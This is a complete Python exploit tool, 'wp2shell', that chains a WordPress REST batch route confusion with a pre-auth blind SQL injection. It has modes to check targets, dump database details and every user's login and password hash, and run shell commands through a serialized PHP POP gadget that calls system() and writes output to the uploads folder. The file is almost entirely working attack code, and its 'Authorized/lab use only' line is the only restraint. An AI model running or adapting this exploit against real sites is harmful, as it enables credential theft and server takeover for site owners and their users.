#!/usr/bin/env python3
"""
wp2shell - unified exploit for the WordPress core pre-auth chain
  CVE-2026-63030  REST /batch/v1 nested-batch route confusion (CWE-436)
  CVE-2026-60137  WP_Query author__not_in SQL injection (CWE-89)
Affected: WordPress 6.9.0-6.9.4 / 7.0.0-7.0.1.  Author: br484.  Authorized/lab use only.

Modes:
  check              detect the vulnerability (boolean oracle + time-based)
  read               blind SQLi: dump db info + wp_users (login+hash), or --sql "<query>"
  rce                full chain to code execution (needs the two realistic preconditions below)

The RCE requires, on the target, what most real sites have (see the writeup):
  (1) a plugin/theme that removes pagination on REST post queries (nopaging/orderby) -> unlocks
      split=false + drops SQL_CALC_FOUND_ROWS -> a UNION returns a fully attacker-controlled row;
  (2) a plugin that unserializes attacker input + ships a POP gadget (Monolog/Guzzle-class).
On a truly stock install (no plugins) the SQLi read works but RCE does not (core POP gadgets are
__wakeup-guarded and split=false cannot be forced) - documented in the writeup.

  python3 wp2shell.py check http://target
  python3 wp2shell.py read  http://target
  python3 wp2shell.py read  http://target --sql "SELECT @@version"
  python3 wp2shell.py rce   http://target --cmd "id; uname -a"
"""
import argparse, json, sys, time, urllib.request, urllib.parse, urllib.error

hx = lambda s: "0x" + s.encode().hex()

class WP2Shell:
    def __init__(self, url, lax="categories", timeout=30):
        self.url = url.rstrip("/"); self.lax = lax; self.timeout = timeout
        self.ALL = None

    # --- CVE-2026-63030 delivery: nested batch that runs posts get_items with a raw author_exclude
    def _deliver(self, inj):
        ae = urllib.parse.quote(inj, safe="")
        inner = {"validation":"normal","requests":[
            {"method":"POST","path":"//a:b"},                                  # misalign inner
            {"method":"GET","path":f"/wp/v2/{self.lax}?author_exclude={ae}"},   # validated as lax, run as posts get_items
            {"method":"GET","path":"/wp/v2/posts"}]}
        outer = {"validation":"normal","requests":[
            {"method":"POST","path":"//a:b"},                                  # misalign outer
            {"method":"POST","path":"/wp/v2/posts","body":inner},              # run batch handler -> smuggle GET
            {"method":"POST","path":"/batch/v1","body":{"requests":[{"method":"POST","path":"/wp/v2/posts"}]}}]}
        req = urllib.request.Request(self.url+"/wp-json/batch/v1",
                                     data=json.dumps(outer).encode(),
                                     headers={"Content-Type":"application/json"})
        t = time.time()
        try: raw = urllib.request.urlopen(req, timeout=self.timeout).read()
        except urllib.error.HTTPError as e: raw = e.read()
        try:
            body = json.loads(raw)["responses"][1]["body"]["responses"][1]["body"]
        except Exception:
            body = None
        return body, raw, time.time()-t

    def count(self, inj):
        body, _, _ = self._deliver(inj)
        return len(body) if isinstance(body, list) else -1

    # --- blind boolean oracle (falls back to time-based if no usable post count)
    def calibrate(self):
        self.ALL = self.count("1) OR 1=1-- -")
        none = self.count("1) OR 1=2-- -")
        if self.ALL > 0 and self.ALL != none:
            self.mode = "boolean"; return True
        _, _, t0 = self._deliver("1) OR 1=2-- -")
        _, _, t1 = self._deliver("1) OR (SELECT SLEEP(2) FROM DUAL WHERE 1=1)-- -")
        self.mode = "time" if (t1 - t0) > 1.2 else None
        return self.mode is not None

    def ask(self, cond):
        if self.mode == "boolean":
            return self.count(f"1) OR ({cond})-- -") == self.ALL
        _, _, t = self._deliver(f"1) OR (SELECT SLEEP(2) FROM DUAL WHERE ({cond}))-- -")
        return t > 1.2

    def read(self, sql, maxlen=512):
        lo, hi = 0, maxlen                                     # length first (binary search)
        while lo < hi:
            mid = (lo+hi+1)//2
            if self.ask(f"LENGTH(({sql}))>={mid}"): lo = mid
            else: hi = mid-1
        n, out = lo, ""
        for pos in range(1, n+1):
            c = f"ASCII(SUBSTRING(({sql}),{pos},1))"
            lo, hi = 0, 127
            while lo < hi:
                mid = (lo+hi)//2
                if self.ask(f"{c}>{mid}"): lo = mid+1
                else: hi = mid
            out += chr(lo); sys.stderr.write(chr(lo)); sys.stderr.flush()
        sys.stderr.write("\n")
        return out

    def read_int(self, sql):
        try: return int(self.read(f"CAST(({sql}) AS CHAR)"))
        except: return 0

    # --- CVE escalation: UNION full-row control -> attacker post_content rendered -> POP -> RCE
    def rce(self, cmd, sc_tag="cachekit"):
        def php_str(s): b=s.encode(); return f's:{len(b)}:"{s}";'
        gadget = ('O:17:"CacheKit_Deferred":2:{' + 's:2:"fn";' + php_str("system")
                  + 's:3:"arg";' + php_str(cmd) + '}')                  # POP: __destruct -> system(cmd)
        content = f"[{sc_tag}]{gadget.encode().hex()}[/{sc_tag}]"        # rendered -> unserialize -> gadget
        E = "TRIM(0x20)"                                                 # empty string (quotes get stripped on the wire)
        cols = ["31337","1","NOW()","NOW()", hx(content), hx("wp2shell"), E, hx("publish"),
                hx("open"), hx("open"), E, hx("pwn"), E, E, "NOW()","NOW()", E, "0",
                hx("http://x/?p=31337"), "0", hx("post"), E, "0"]        # 23 x wp_posts.* columns
        self._deliver("0) UNION SELECT " + ",".join(cols) + "-- -")

def main():
    ap = argparse.ArgumentParser(description="wp2shell exploit (CVE-2026-63030 + 60137) - br484")
    ap.add_argument("mode", choices=["check","read","rce"])
    ap.add_argument("url")
    ap.add_argument("--sql", help="read mode: run one SQL scalar query")
    ap.add_argument("--cmd", default="id; uname -a", help="rce mode: shell command")
    ap.add_argument("--lax", default="categories", help="lax route for the injected sub-request")
    ap.add_argument("--sc", default="cachekit", help="rce mode: target shortcode tag")
    a = ap.parse_args()
    x = WP2Shell(a.url, lax=a.lax)

    if not x.calibrate():
        sys.exit("[-] not vulnerable (batch confusion / SQLi did not fire)")
    print(f"[+] {a.url} vulnerable - pre-auth SQL injection ({x.mode} oracle)")
    if a.mode == "check":
        return

    if a.mode == "read":
        if a.sql:
            print(f"[*] {a.sql} => {x.read(a.sql)}"); return
        print("[*] db version :", x.read("SELECT @@version"))
        print("[*] db user    :", x.read("SELECT current_user()"))
        print("[*] db name    :", x.read("SELECT database()"))
        n = x.read_int("SELECT COUNT(*) FROM wp_users")
        print(f"[*] wp_users ({n}):")
        for i in range(n):
            print("    -", x.read(f"SELECT CONCAT(ID,0x7c,user_login,0x7c,user_pass) FROM wp_users ORDER BY ID LIMIT {i},1"))
        return

    if a.mode == "rce":
        marker = f"/tmp/wp2s_{int(time.time())}"
        x.rce(f"({a.cmd}) > /var/www/html/wp-content/uploads/wp2s_out.txt 2>&1; touch {marker}")
        time.sleep(1)
        try:
            out = urllib.request.urlopen(a.url+"/wp-content/uploads/wp2s_out.txt", timeout=15).read().decode(errors="replace")
            print("[+] RCE OK - command output:\n" + "-"*48 + "\n" + out + "-"*48)
        except Exception as e:
            print(f"[-] no output file ({e}). If the target lacks the RCE preconditions, only SQLi (read) works.")

if __name__ == "__main__":
    main()
